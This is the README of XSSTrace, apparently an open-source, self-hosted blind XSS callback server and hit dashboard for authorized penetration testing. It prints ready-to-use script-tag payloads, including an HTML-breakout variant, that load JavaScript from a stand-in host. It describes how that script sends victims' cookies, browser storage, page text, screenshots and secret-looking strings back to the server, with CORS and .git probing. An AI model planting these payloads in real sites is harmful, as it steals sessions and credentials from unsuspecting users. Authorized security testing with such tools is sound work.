# XSSTrace

![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)
![Express](https://img.shields.io/badge/Express-4.x-000000?logo=express&logoColor=white)
![Render](https://img.shields.io/badge/Deploy-Render-46E3B7?logo=render&logoColor=000)
![Discord](https://img.shields.io/badge/Discord-Notifications-5865F2?logo=discord&logoColor=white)
![License](https://img.shields.io/github/license/Ranveerrrrr/XSSTrace)

A self-hosted Blind XSS payload server and hit dashboard with unlimited markers, page grouping, filters, import/export, screenshots, storage capture and Discord alerts.

<img width="1906" height="905" alt="image" src="https://github.com/user-attachments/assets/ef51872a-5811-441e-a39e-45f05dabc43f" />
<img width="1919" height="576" alt="image" src="https://github.com/user-attachments/assets/0be6b493-1464-458f-966d-48d9159546d8" />


## Table of contents

- [Why this exists](#why-this-exists)
- [How it works](#how-it-works)
- [Features](#features)
- [Routes](#routes)
- [Requirements](#requirements)
- [Quick start (local)](#quick-start-local)
- [Deploy on Render](#deploy-on-render)
- [Environment variables](#environment-variables)
- [Free persistence with Upstash Redis](#free-persistence-with-upstash-redis)
- [Persistent disk (optional)](#persistent-disk-optional)
- [Connecting a custom domain](#connecting-a-custom-domain)
- [Test page](#test-page)
- [Using the payloads](#using-the-payloads)
- [The dashboard](#the-dashboard)
- [Discord alerts](#discord-alerts)
- [What gets captured](#what-gets-captured)
- [Import and export](#import-and-export)
- [Security and privacy](#security-and-privacy)
- [Troubleshooting](#troubleshooting)
- [Credits](#credits)
- [License](#license)

## Why this exists

Blind XSS testing is painful when your callback tooling does not give you enough control.

- Burp Collaborator and Interactsh payloads are temporary or tied to a session.
- Public callback services can expire, rotate, or disappear.
- Classic XSS Hunter-style setups are useful, but many workflows end up with one generic payload path.
- When testing many fields, forms, endpoints, and roles, you need to know exactly which payload fired.

A generic Blind XSS callback only tells you that **something fired**. It does not tell you **which exact injection point caused the hit**. If you inject payloads into a profile name, a support ticket, an admin note, a billing address and a contact form, a single callback URL is not enough.

XSSTrace gives every injection point its own marker:

```html
<script src="https://xss.yourdomain.com/x/signup-name"></script>
<script src="https://xss.yourdomain.com/x/support-ticket"></script>
<script src="https://xss.yourdomain.com/x/admin-note"></script>
<script src="https://xss.yourdomain.com/x/billing-address"></script>
```

Everything after `/x/` is the marker. When a payload fires, the dashboard shows the marker, the page, the time, the visitor's IP, cookies, storage, DOM text and (when the browser allows it) a screenshot. Every hit can also be sent to Discord.

## How it works

```text
                    ┌──────────────────────────────────────────────┐
                    │  XSSTrace server (Render / any Node host)    │
                    │                                              │
Inject payload ───▶ │  GET  /x/<marker>                            │
in a target app     │    ├─ log a "payload-load" hit               │
                    │    └─ return bugatsec.js patched with        │
                    │       your base URL + marker                 │
                    │                                              │
Victim's browser ─▶ │  POST /js_callback   (multipart)             │
executes the JS     │    ├─ cookies, localStorage, sessionStorage  │
                    │    ├─ page text, title, screenshot           │
                    │    └─ secrets / CORS / .git probe results    │
                    │                                              │
                    │  append → callbacks.jsonl                    │
                    │  mirror → Upstash Redis (optional)           │
                    │  notify → Discord webhook (optional)         │
                    └──────────────────────┬───────────────────────┘
                                           │
                            ┌──────────────▼──────────────┐
                            │  /dashboard (password login) │
                            │  grouped hits + screenshots  │
                            └─────────────────────────────┘
```

1. You host XSSTrace and inject `<script src="https://your-host/x/<marker>">` into an authorized target.
2. When a victim's browser loads the target page, it requests `/x/<marker>`.
3. The server records a **fetch-only** hit (it now knows the page and IP) and returns `bugatsec.js`, patched at request time with your `PUBLIC_BASE_URL` and the marker name.
4. The script runs in the victim's browser. It collects cookies, storage, DOM text, a screenshot and optional secret-looking strings, then POSTs them as `multipart/form-data` to `/js_callback`.
5. The server normalizes the hit, appends it to `callbacks.jsonl`, mirrors it to Redis if configured, and sends a Discord embed.
6. The dashboard polls `/api/callbacks` every 5 seconds and groups hits by page URL.

If `bugatsec.js` is missing, the server falls back to a small built-in payload that posts JSON to `/callback` and fires an image beacon to `/i/<marker>.gif`.

## Features

- Unlimited marker paths: `/x/firstname`, `/x/admin-note`, `/x/support-ticket`, ...
- Password-protected dashboard with HMAC-signed session cookies and login rate limiting.
- Fetch-only hits are logged even before JavaScript executes, so you see the page and IP immediately.
- Full execution hits include cookies, `localStorage`, `sessionStorage`, page title, DOM text, headers and a screenshot.
- Optional secret scanning from the XSS Hunter Express payload (AWS access keys, Slack webhook URLs, GCP service-account JSON).
- Optional CORS misconfiguration and exposed `.git` probing.
- Hits grouped by page URL with per-page filters: page, IP, marker.
- Per-page actions: copy URL, delete page.
- Raw-body capture for non-JSON submissions sent to `/x/*`.
- Download all hits as `callbacks.jsonl`, and merge old logs without losing current data.
- Optional Discord webhook alerts, including the screenshot as an attachment.
- Optional Upstash Redis mirror so hits survive Render free-plan restarts (no extra npm dependency).
- Self-test page at `/test` that executes a real payload and validates capture end to end.
- `/health` endpoint for uptime checks; `/debug/status` is available to authenticated users only.

## Routes

| Route | Auth | Purpose |
| --- | --- | --- |
| `/` | No | Landing page with a sample payload. |
| `/test` | No | Self-test page; executes a real payload (`?marker=` to choose the marker). |
| `/x/<marker>` | No | Serves the patched payload and logs a fetch-only hit. |
| `POST /x/<marker>` | No | Captures the raw body of non-JSON POSTs made to a marker URL. |
| `/i/<marker>.gif` | No | 1x1 image beacon fallback. |
| `POST /callback` | No | JSON/beacon callback used by the fallback payload. |
| `POST /js_callback` | No | Multipart callback used by `bugatsec.js` (cookies, storage, screenshot). |
| `POST /js_page_callback` | No | Page-source callback (`send_collected_page`). |
| `/login`, `POST /login` | No | Dashboard login. |
| `POST /logout` | No | Clears the session cookie. |
| `/dashboard` | Yes | Hit dashboard. |
| `/api/callbacks` | Yes | JSON list of hits. |
| `POST /api/callbacks/clear` | Yes | Deletes every hit. |
| `/api/callbacks/download` | Yes | Downloads `callbacks.jsonl`. |
| `POST /api/callbacks/import` | Yes | Appends imported hits. |
| `POST /api/callbacks/delete-page` | Yes | Deletes all hits for one page key. |
| `POST /api/callbacks/move-page` | Yes | Moves hits between page groups. |
| `/health` | No | Basic status; never reveals credentials or secrets. |
| `/debug/status` | Yes | Debug info and the last 5 hits, including captured data. |

## Requirements

- Node.js **18 or newer** (the server uses the global `fetch`, `FormData` and `Blob`).
- A host that runs a Node web service (Render, Railway, Fly.io, a VPS, etc.). This is not a static site: it must receive and store callbacks.
- Optional: a free [Upstash](https://upstash.com/) Redis database for persistence on hosts with ephemeral disks.
- Optional: a Discord webhook for alerts.

## Quick start (local)

```bash
git clone https://github.com/YOUR_USERNAME/XSSTrace.git
cd XSSTrace
npm install
```

Set the required variables, then start the server.

PowerShell:

```powershell
$env:PUBLIC_BASE_URL="http://localhost:10000"
$env:DASHBOARD_USERNAME="admin"
$env:DASHBOARD_PASSWORD="change-me"
$env:SESSION_SECRET="a-long-random-string"
npm start
```

bash:

```bash
export PUBLIC_BASE_URL="http://localhost:10000"
export DASHBOARD_USERNAME="admin"
export DASHBOARD_PASSWORD="change-me"
export SESSION_SECRET="a-long-random-string"
npm start
```

Open:

```text
http://localhost:10000/dashboard
```

Log in with `DASHBOARD_USERNAME` / `DASHBOARD_PASSWORD`. Open `/test` to send a real hit through the full pipeline.

> The app reads configuration from environment variables only. It does not auto-load a `.env` file. On Node 20.6+ you can use `node --env-file=.env server.js`.

## Deploy on Render

A `render.yaml` blueprint is included. The fastest path:

1. Fork this repository (keep your fork private if you do not want your configuration visible).
2. In [Render](https://render.com/), click **New + → Blueprint** and select your fork.
3. Render reads `render.yaml` and creates a **free** Node web service using:
   - Build command: `npm install`
   - Start command: `npm start`
4. Fill in the environment variables when prompted (see below). At minimum set `PUBLIC_BASE_URL`, `DASHBOARD_USERNAME`, `DASHBOARD_PASSWORD` and `SESSION_SECRET`.
5. Deploy, then open `https://<your-service>.onrender.com/dashboard`.

Manual setup (without the blueprint) uses the same build/start commands and the same environment variables.

Render free services spin down after inactivity. The first request after a spin-down can take 30–60 seconds. Hits are only durable if you enable Redis (or use a paid persistent disk).

## Environment variables

| Variable | Required | Example | Description |
| --- | --- | --- | --- |
| `PUBLIC_BASE_URL` | Yes (in production) | `https://xss.yourdomain.com` | Public origin used in payloads, Discord links and the cookie `Secure` flag. No trailing slash. Falls back to Render's `RENDER_EXTERNAL_URL`, then `http://localhost:PORT`. |
| `DASHBOARD_USERNAME` | Yes | `admin` | Dashboard login username. |
| `DASHBOARD_PASSWORD` | Yes | `use-a-long-password` | Dashboard login password. |
| `SESSION_SECRET` | Strongly recommended | `long-random-string` | HMAC key for the session cookie. Falls back to `DASHBOARD_PASSWORD` if unset. |
| `DISCORD_WEBHOOK_URL` | No | `https://discord.com/api/webhooks/...` | Sends an embed (and screenshot) for every hit. |
| `DATA_DIR` | No | `/var/data` | Directory for `callbacks.jsonl`. Defaults to the app directory. |
| `UPSTASH_REDIS_REST_URL` | No | `https://your-db.upstash.io` | Upstash REST endpoint. Enables the Redis mirror when set together with the token. |
| `UPSTASH_REDIS_REST_TOKEN` | No | `AX...` | Upstash REST token. |
| `UPSTASH_REDIS_KEY` | No | `xsstrace:callbacks` | Redis list key. Defaults to `xsstrace:callbacks`. |
| `PORT` | No | `10000` | HTTP port. Render sets this automatically. |

Never commit real values. Keep them in Render's environment settings or your local shell.

Check that auth is configured without exposing secrets:

```text
https://xss.yourdomain.com/health
```

Expected:

```json
{
  "ok": true,
  "authConfigured": true,
  "hasDashboardUsername": true,
  "hasDashboardPassword": true,
  "hasSessionSecret": true
}
```

## Free persistence with Upstash Redis

Render free web services cannot attach a persistent disk. Without persistence, the local `callbacks.jsonl` is lost on every restart or redeploy. To keep hits for free, mirror the log to Upstash Redis over its REST API. No npm package is needed.

1. Create a free account at [upstash.com](https://upstash.com/).
2. Create a **Redis** database (choose the free tier and the region closest to your Render service).
3. Open the database → **REST API** and copy:
   - `UPSTASH_REDIS_REST_URL`
   - `UPSTASH_REDIS_REST_TOKEN`
4. Add them in Render under **Environment** (and optionally `UPSTASH_REDIS_KEY`):

```text
UPSTASH_REDIS_REST_URL=https://your-db.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-token
UPSTASH_REDIS_KEY=xsstrace:callbacks
```

5. Redeploy.

How the mirror behaves:

- Every hit is appended to the local JSONL file **and** pushed to the Redis list with `RPUSH`.
- On startup, if the local log is empty, the server pages through the Redis list and rebuilds `callbacks.jsonl`.
- Clear, delete-page and move-page operations are mirrored to Redis as well.
- Writes are batched for imports, and oversized screenshots are kept under Upstash's request limits. Very large screenshots may exceed the free Upstash request size, in which case the hit is still stored locally and the Redis mirror logs an error.

Free-tier caveats:

- Upstash free databases have a monthly command and bandwidth quota. A busy instance can exhaust it; the local file continues to work, but durability across restarts stops until the quota resets or you upgrade.
- The Redis key grows forever unless you clear hits in the dashboard or set `UPSTASH_REDIS_KEY` to a fresh value.
- Redis is only a mirror. `PUBLIC_BASE_URL` still controls the URLs inside payloads.

## Persistent disk (optional)

If you are on a paid Render plan, you can attach a disk instead of (or in addition to) Redis:

1. Open your Web Service → **Disks** → add a disk.
2. Mount path: `/var/data`.
3. Set `DATA_DIR=/var/data`.

The log is then stored at `/var/data/callbacks.jsonl` and survives redeploys.

## Connecting a custom domain

Use a dedicated subdomain, for example `xss.yourdomain.com`:

```text
Main website:       https://yourdomain.com
Blind XSS server:   https://xss.yourdomain.com
Dashboard:          https://xss.yourdomain.com/dashboard
Payload base:       https://xss.yourdomain.com/x/<marker>
```

1. Render → your service → **Settings → Custom Domains** → add `xss.yourdomain.com`.
2. Create the DNS record Render shows (usually a `CNAME` from `xss` to `your-service.onrender.com`).
3. Wait for DNS and Render-managed TLS.
4. Set `PUBLIC_BASE_URL=https://xss.yourdomain.com` and redeploy.

Use HTTPS. Cookies captured by the payload are sensitive, and the dashboard sets `Secure` cookies when `PUBLIC_BASE_URL` starts with `https://`.

## Test page

Open `/test` on your deployment:

```text
https://xss.yourdomain.com/test
```

The page sets a cookie, `localStorage` and `sessionStorage`, then loads a real payload. Within a few seconds the dashboard should show an execution hit (source `bugatsec-payload`) with cookies, page text and a JPEG screenshot.

Choose a marker:

```text
https://xss.yourdomain.com/test?marker=my-test
```

Opening `/x/<marker>` directly in a browser only records a `payload-load` hit, because the script is fetched but the rich collection is not triggered in that context. Use `/test` to validate the full pipeline.

## Using the payloads

Basic single script:

```html
<script src="https://xss.yourdomain.com/x/blind-xss"></script>
```

One marker per injection point:

```html
<script src="https://xss.yourdomain.com/x/signup-name"></script>
<script src="https://xss.yourdomain.com/x/profile-bio"></script>
<script src="https://xss.yourdomain.com/x/admin-note"></script>
<script src="https://xss.yourdomain.com/x/billing-address"></script>
```

The dashboard payload builder also produces a two-script variant:

```html
<script src="https://xss.yourdomain.com/x/blind-xss"></script>"/><script src="https://xss.yourdomain.com/x/blind-xss1"></script>
```

The second script can help in broken HTML contexts where one form of injection closes or escapes differently than another.

Markers are sanitized in the response and JSON-escaped into the script, so a marker cannot break out of the injected string. Use short, descriptive, unique markers.

## The dashboard

Open:

```text
https://xss.yourdomain.com/dashboard
```
<img width="1906" height="905" alt="image" src="https://github.com/user-attachments/assets/ef51872a-5811-441e-a39e-45f05dabc43f" />
<img width="1919" height="576" alt="image" src="https://github.com/user-attachments/assets/636972c5-457c-427d-9efd-21c7908b30ec" />


Features:

- Payload builder with copy-to-clipboard.
- Total hits, unique markers and page count.
- Page groups with hit/IP counts and last-hit time.
- Filters for page URL, IP and marker, with suggestions.
- A **Fetch-only** toggle to show or hide `payload-load` / image hits.
- Expandable hit cards with cookies, storage, request headers, DOM snapshot and screenshot.
- Per-page actions: copy page URL and delete the page.
- Import/export dialog and clear-all.
- Deep links: Discord's "Open in dashboard" uses `/dashboard#hit=<timestamp>` and expands the matching hit.

## Discord alerts

1. In Discord: **Edit Channel → Integrations → Webhooks → New Webhook**.
2. Copy the webhook URL.
3. Set `DISCORD_WEBHOOK_URL` in Render and redeploy.

Each hit sends an embed with marker, source, IP, page, user agent, page title, cookies, `localStorage`, `sessionStorage`/request headers, raw body when present, and a dashboard link. Screenshots are attached inline. Long bodies are split across messages instead of being silently truncated.

The crawler user agent `facebookexternalhit/1.1` is ignored to avoid noisy alerts.
<img width="221" height="606" alt="image" src="https://github.com/user-attachments/assets/103ace92-0fb5-4c94-80a7-3ee255c8e0a9" />

## What gets captured

| Field | Where it comes from |
| --- | --- |
| `receivedAt` | Server timestamp (ISO 8601). |
| `ip` | Cloudflare `cf-connecting-ip`, then `x-forwarded-for`, then socket IP. |
| `marker` | The path after `/x/`. |
| `pageUrl` | Victim page URL (`uri`) or `Referer` for fetch-only hits. |
| `referrer` | `document.referrer`. |
| `userAgent`, `language`, `viewport` | Browser values. |
| `title`, `origin` | Page title and origin. |
| `windowName` | Extra diagnostics (e.g. probe UID, browser time, CORS/git probe results). |
| `cookies` | `document.cookie` (HttpOnly cookies are not visible to JavaScript). |
| `localStorage` | Storage dump, plus secret-scan findings from the payload. |
| `sessionStorage` | Storage dump, or request headers for fetch-only hits. |
| `domSnapshot` | Uploaded screenshot as a data URI, or collected page HTML. |
| `rawBody` | Raw body posted to `/x/*` (for non-JSON integrations). |
| `source` | `payload-load`, `bugatsec-payload`, `bugatsec-page`, `script`, `image`, `payload-post` or `import`. |

Size limits: JSON bodies 10 MB, uploaded screenshot 10 MB, page HTML field 2 MB, screenshots stored up to ~14M base64 chars, `/x/*` raw body 1 MB, imported entries 5000 per request.

## Import and export

`Download hits` downloads the current backend log as NDJSON:

```text
callbacks.jsonl
```

Import accepts:

- JSONL (one hit per line)
- a JSON array of hits
- a JSON object with a `callbacks` array

Selecting a file previews it in the browser. `Add to logs` appends the previewed hits; it never replaces existing hits.

## Security and privacy

This tool captures authentication material by design. Treat every hit as sensitive.

- Only test systems you are authorized to test.
- Never commit `.env`, `callbacks.jsonl`, dashboard passwords, `SESSION_SECRET`, Upstash tokens or Discord webhook URLs.
- Set a strong `DASHBOARD_USERNAME` / `DASHBOARD_PASSWORD` and a long random `SESSION_SECRET`.
- Use HTTPS for the callback domain.
- Restrict the dashboard to people you trust. Anyone with the login can read captured cookies and screenshots.
- Keep the repository private if you customize it with personal configuration.
- Rotate credentials immediately if they are exposed. Deleting a commit is not enough once it is pushed.
- `/debug/status` is behind the dashboard login. Do not add public debug routes that dump hit data.
- The dashboard renders all hit data with HTML escaping, and marker names are JSON-escaped into the payload.
- Login is rate-limited to 8 failed attempts per IP per 10 minutes.
- The session cookie is `HttpOnly`, `SameSite=Lax`, and `Secure` when served over HTTPS.

If you fork this publicly, run a secret scanner such as `gitleaks` before pushing. This repository intentionally contains no real credentials, domains, tokens or webhook URLs.

## Troubleshooting

**Dashboard says credentials are not configured.**
Set `DASHBOARD_USERNAME`, `DASHBOARD_PASSWORD` and `SESSION_SECRET` and redeploy. Check `/health` for `authConfigured`.

**No hits arrive.**
Open `<PUBLIC_BASE_URL>/test`. If the test hit arrives, the server is healthy and the issue is in the target page/CSP. If it does not, check Render logs and confirm `PUBLIC_BASE_URL` matches the URL you actually injected.

**Hits disappear after a while.**
Render free instances have an ephemeral disk. Enable Upstash Redis (see above).

**Only fetch-only hits, no cookies or screenshots.**
The browser fetched the script but did not execute it (CSP, wrong context, or the marker URL was opened directly). Use `/test` and check the target's Content-Security-Policy.

**Screenshot is missing.**
The screenshot is best-effort. Cross-origin images, canvas tainting, strict CSP or a large page can prevent it.

**Discord alerts fail.**
Verify `DISCORD_WEBHOOK_URL` is the full webhook URL and the channel still exists. Check Render logs for `Discord notification failed`.

**Redis restore fails or hits are not restored.**
Confirm both `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` are set, the database is active, and the free quota is not exhausted. Check Render logs for `Upstash ... failed`.

**Login returns 429.**
Too many failed attempts from your IP. Wait 10 minutes.

## Credits

- `bugatsec.js` is based on the [XSS Hunter Express](https://github.com/xss-hunter/xss-hunter-express) payload, and bundles [html2canvas](https://html2canvas.hertzen.com/) (MIT) and [OpenPGP.js](https://www.openpgp.org/) for screenshots and optional PGP encryption.
- The dashboard and server are original work released under the MIT license below.

## License

See [LICENSE](LICENSE).
